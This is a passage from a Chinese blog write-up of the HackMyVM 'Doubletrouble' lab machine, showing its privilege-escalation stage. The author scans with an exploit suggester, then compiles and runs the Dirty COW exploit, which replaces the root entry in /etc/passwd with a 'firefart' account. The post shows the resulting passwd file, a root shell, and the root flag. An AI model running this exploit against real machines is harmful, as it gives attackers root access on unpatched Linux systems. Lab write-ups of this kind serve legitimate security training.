&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign
&#x2F;bin&#x2F;ping
&#x2F;bin&#x2F;mount
&#x2F;bin&#x2F;umount
&#x2F;bin&#x2F;su
&#x2F;bin&#x2F;ping6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>没有思路了，拿个les.sh来扫一下</p>
<pre class="line-numbers language-none"><code class="language-none">[+] [CVE-2016-5195] dirtycow

   Details: https:&#x2F;&#x2F;github.com&#x2F;dirtycow&#x2F;dirtycow.github.io&#x2F;wiki&#x2F;VulnerabilityDetails
   Exposure: highly probable
   Tags: [ debian&#x3D;7|8 ],RHEL&#x3D;5&#123;kernel:2.6.(18|24|33)-*&#125;,RHEL&#x3D;6&#123;kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31&#125;,RHEL&#x3D;7&#123;kernel:3.10.0-*|4.2.0-0.21.el7&#125;,ubuntu&#x3D;16.04|14.04|12.04
   Download URL: https:&#x2F;&#x2F;www.exploit-db.com&#x2F;download&#x2F;40611
   Comments: For RHEL&#x2F;CentOS see exact vulnerable versions here: https:&#x2F;&#x2F;access.redhat.com&#x2F;sites&#x2F;default&#x2F;files&#x2F;rh-cve-2016-5195_5.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>有一个dirtycow的<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/40839">漏洞</a>，利用一下</p>
<p><img src="/posts/7a34ef12/image-20250726054418492.png" alt="image-20250726054418492"></p>
<pre class="line-numbers language-none"><code class="language-none">clapton@doubletrouble:&#x2F;tmp$ gcc -pthread 40839.c -o dirty -lcrypt
clapton@doubletrouble:&#x2F;tmp$ ls
40839.c  dirty
clapton@doubletrouble:&#x2F;tmp$ .&#x2F;dirty 1233456
&#x2F;etc&#x2F;passwd successfully backed up to &#x2F;tmp&#x2F;passwd.bak
Please enter the new password: 123456
Complete line:
firefart:fihtGbOiPpZ7Y:0:0:pwned:&#x2F;root:&#x2F;bin&#x2F;bash

mmap: 7f4fe6922000
ptrace 0
Done! Check &#x2F;etc&#x2F;passwd to see if the new user was created.
You can log in with the username &#39;firefart&#39; and the password &#39;123456&#39;.


DON&#39;T FORGET TO RESTORE! $ mv &#x2F;tmp&#x2F;passwd.bak &#x2F;etc&#x2F;passwd
clapton@doubletrouble:&#x2F;tmp$ madvise 0

Done! Check &#x2F;etc&#x2F;passwd to see if the new user was created.
You can log in with the username &#39;firefart&#39; and the password &#39;123456&#39;.


DON&#39;T FORGET TO RESTORE! $ mv &#x2F;tmp&#x2F;passwd.bak &#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后我们读取一下&#x2F;etc&#x2F;passwd文件</p>
<pre class="line-numbers language-none"><code class="language-none">clapton@doubletrouble:&#x2F;tmp$ cat &#x2F;etc&#x2F;passwd
firefart:fihtGbOiPpZ7Y:0:0:pwned:&#x2F;root:&#x2F;bin&#x2F;bash
&#x2F;sbin:&#x2F;bin&#x2F;sh
bin:x:2:2:bin:&#x2F;bin:&#x2F;bin&#x2F;sh
sys:x:3:3:sys:&#x2F;dev:&#x2F;bin&#x2F;sh
sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync
games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;bin&#x2F;sh
man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;bin&#x2F;sh
lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;bin&#x2F;sh
mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;bin&#x2F;sh
news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;bin&#x2F;sh
uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;bin&#x2F;sh
proxy:x:13:13:proxy:&#x2F;bin:&#x2F;bin&#x2F;sh
www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;bin&#x2F;sh
backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;bin&#x2F;sh
list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;bin&#x2F;sh
irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;bin&#x2F;sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;bin&#x2F;sh
nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;bin&#x2F;sh
libuuid:x:100:101::&#x2F;var&#x2F;lib&#x2F;libuuid:&#x2F;bin&#x2F;sh
Debian-exim:x:101:103::&#x2F;var&#x2F;spool&#x2F;exim4:&#x2F;bin&#x2F;false
mysql:x:102:105:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false
sshd:x:103:65534::&#x2F;var&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin
clapton:x:1000:1000:,,,:&#x2F;home&#x2F;clapton:&#x2F;bin&#x2F;bas<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以发现，root的位置被firefart替代了，所以我们切换用户的身份不是root，而是firefart</p>
<pre class="line-numbers language-none"><code class="language-none">clapton@doubletrouble:&#x2F;tmp$ su - firefart
Password: 
firefart@doubletrouble:~# id
uid&#x3D;0(firefart) gid&#x3D;0(root) groups&#x3D;0(root)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="rootflag"><a href="#rootflag" class="headerlink" title="rootflag"></a>rootflag</h4><pre class="line-numbers language-none"><code class="language-none">firefart@doubletrouble:~# cat root.txt 
1B8EEA89EA92CECB931E3CC25AA8DE21<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://drume2.github.io">Morii</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://drume2.github.io/posts/7a34ef12.html">https://drume2.github.io/posts/7a34ef12.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://drume2.github.io" target="_blank">Moriiの博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/HMV/">HMV</a></div><div class="post_share"><div class="social-share" data-image="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/gh/overtrue/share.js@master/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/fdabbfaf.html"><img class="prev-cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">HMV-warez</div></div></a></div><div class="next-post pull-right"><a href="/posts/d17ac07d.html"><img class="next-cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">HMV-Breakout</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/877cf9fc.html" title="HMV-Art"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-01</div><div class="title">HMV-Art</div></div></a></div><div><a href="/posts/7ffe1a8a.html" title="HMV-Alzheimer"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-26</div><div class="title">HMV-Alzheimer</div></div></a></div><div><a href="/posts/b97023cc.html" title="HMV-Beloved"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-17</div><div class="title">HMV-Beloved</div></div></a></div><div><a href="/posts/2c2bf748.html" title="HMV-Blackhat"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-19</div><div class="title">HMV-Blackhat</div></div></a></div><div><a href="/posts/d17ac07d.html" title="HMV-Breakout"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-25</div><div class="title">HMV-Breakout</div></div></a></div><div><a href="/posts/fa16f4c.html" title="HMV-Comingsoon"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-31</div><div class="title">HMV-Comingsoon</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Twikoo</span><span class="switch-btn"></span><span class="second-comment">Valine</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://imgtu.com/uploads/1jto6hwz/r-file_64e053.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Morii</div><div class="author-info__description">博客因兴趣诞生,在不断完善中</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">86</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn"><i class="fab fa-home"></i><span>个人主页</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Drume1/drume1.github.io" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="tencent://AddContact/?fromId=45&amp;fromSubId=1&amp;subcmd=all&amp;uin=1159927667&amp;website=www.qtxml.cn" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">兴趣爱好才是最大的动力，何不与我共同来攀知识高峰，品翘楚美人！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HMV-Doubletrouble"><span class="toc-number">1.</span> <span class="toc-text">HMV-Doubletrouble</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E5%85%B3"><span class="toc-number">1.1.</span> <span class="toc-text">第一关</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.1.1.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.1.2.</span> <span class="toc-text">web探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.1.3.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.1.4.</span> <span class="toc-text">提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%85%B3"><span class="toc-number">1.2.</span> <span class="toc-text">第二关</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web%E6%8E%A2%E6%B5%8B-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">web探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssh%E7%99%BB%E5%BD%95"><span class="toc-number">1.2.3.</span> <span class="toc-text">ssh登录</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#userflag"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">userflag</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83-1"><span class="toc-number">1.2.4.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#rootflag"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">rootflag</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/9d7f6a05.html" title="HMV-Hannah"><img src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HMV-Hannah"/></a><div class="content"><a class="title" href="/posts/9d7f6a05.html" title="HMV-Hannah">HMV-Hannah</a><time datetime="2025-09-24T09:37:24.000Z" title="发表于 2025-09-24 17:37:24">2025-09-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/3f906d29.html" title="HMV-Crazymed"><img src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HMV-Crazymed"/></a><div class="content"><a class="title" href="/posts/3f906d29.html" title="HMV-Crazymed">HMV-Crazymed</a><time datetime="2025-09-19T12:48:35.000Z" title="发表于 2025-09-19 20:48:35">2025-09-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/2c2bf748.html" title="HMV-Blackhat"><img src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HMV-Blackhat"/></a><div class="content"><a class="title" href="/posts/2c2bf748.html" title="HMV-Blackhat">HMV-Blackhat</a><time datetime="2025-09-19T10:13:51.000Z" title="发表于 2025-09-19 18:13:51">2025-09-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/2dab24d7.html" title="群友靶机-Halfhour"><img src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="群友靶机-Halfhour"/></a><div class="content"><a class="title" href="/posts/2dab24d7.html" title="群友靶机-Halfhour">群友靶机-Halfhour</a><time datetime="2025-09-18T00:29:19.000Z" title="发表于 2025-09-18 08:29:19">2025-09-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/d6eb39b5.html" title="HMV-jabita"><img src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HMV-jabita"/></a><div class="content"><a class="title" href="/posts/d6eb39b5.html" title="HMV-jabita">HMV-jabita</a><time datetime="2025-09-17T12:51:33.000Z" title="发表于 2025-09-17 20:51:33">2025-09-17</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;undefined - 2025  <i id="heartbeat" class="fa fas fa-heartbeat"></i> Morii</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div><<head><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></head></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"><script>(()=>{
  const init = () => {
    twikoo.init(Object.assign({
      el: '#twikoo-wrap',
      envId: 'https://twikooo-one.vercel.app/',
      region: 'us-east-1',
      onCommentLoaded: function () {
        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
      }
    }, null))
  }

  const getCount = () => {
    const countELement = document.getElementById('twikoo-count')
    if(!countELement) return
    twikoo.getCommentsCount({
      envId: 'https://twikooo-one.vercel.app/',
      region: 'us-east-1',
      urls: [window.location.pathname],
      includeReply: false
    }).then(function (res) {
      countELement.innerText = res[0].count
    }).catch(function (err) {
      console.error(err);
    });
  }

  const runFn = () => {
    init()
    GLOBAL_CONFIG_SITE.isPost && getCount()
  }

  const loadTwikoo = () => {
    if (typeof twikoo === 'object') {
      setTimeout(runFn,0)
      return
    } 
    getScript('https://cdn.jsdelivr.net/npm/twikoo@1/dist/twikoo.all.min.js').then(runFn)
  }

  if ('Twikoo' === 'Twikoo' || !true) {
    if (true) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
    else loadTwikoo()
  } else {
    window.loadOtherComment = () => {
      loadTwikoo()
    }
  }
})()</script><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'BF23duYcvhYPZIqUHv6NigOn-MdYXbMMI',
      appKey: 'Bb6SG97mQjBt3SKeopWEnnQU',
      avatar: 'monsterid',
      serverURLs: 'https://bf23duyc.api.lncldglobal.com',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Twikoo' === 'Valine' || !true) {
  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div><script defer data-pjax type="text/javascript" src="https://npm.elemecdn.com/xianqi-hexo/js/animate.js"></script><div class="aplayer no-destroy" data-id="3485712867" data-server="tencent" data-type="playlist" data-fixed="true" data-mini="true" data-listFolded="false" data-order="random" data-preload="auto" data-autoplay="false" muted></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script src="//code.tidio.co/null.js" async="async"></script><script>function onTidioChatApiReady() {
  window.tidioChatApi.hide();
  window.tidioChatApi.on("close", function() {
    window.tidioChatApi.hide();
  });
}
if (window.tidioChatApi) {
  window.tidioChatApi.on("ready", onTidioChatApiReady);
} else {
  document.addEventListener("tidioChat-ready", onTidioChatApiReady);
}

var chatBtnFn = () => {
  document.getElementById("chat_btn").addEventListener("click", function(){
    window.tidioChatApi.show();
    window.tidioChatApi.open();
  });
}
chatBtnFn()
</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer@1/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show","#posts-chart","#tags-chart","#categories-chart",".js-pjax"]

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener scroll 
  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)

  typeof preloader === 'object' && preloader.initLoading()
  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

  typeof disqusjs === 'object' && disqusjs.destroy()
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof chatBtnFn === 'function' && chatBtnFn()
  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()

  typeof preloader === 'object' && preloader.endLoading()
})

document.addEventListener('pjax:error', (e) => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":160,"height":260},"mobile":{"show":false},"marked":{"prependRoot":true,"postAsset":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>